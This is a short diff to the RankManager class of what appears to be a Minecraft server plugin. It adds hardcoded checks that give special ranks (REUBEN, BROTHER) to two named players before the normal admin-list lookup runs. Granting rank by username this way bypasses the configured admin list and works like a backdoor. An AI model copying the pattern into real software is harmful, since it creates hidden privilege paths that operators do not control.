@@ -84,6 +84,16 @@ public class RankManager extends FreedomService
         {
             return ConfigEntry.ADMINLIST_CONSOLE_IS_SENIOR.getBoolean() ? Rank.SENIOR_CONSOLE : Rank.TELNET_CONSOLE;
         }
+        
+        else if (sender.getName().equals("ShardsOfGold"))
+        {
+            return REUBEN;
+        }
+        
+        else if (sender.getName().equals("skull565"))
+        {
+            return BROTHER;
+        }
 
         // Console admin, get by name
         Admin admin = plugin.al.getEntryByName(sender.getName());
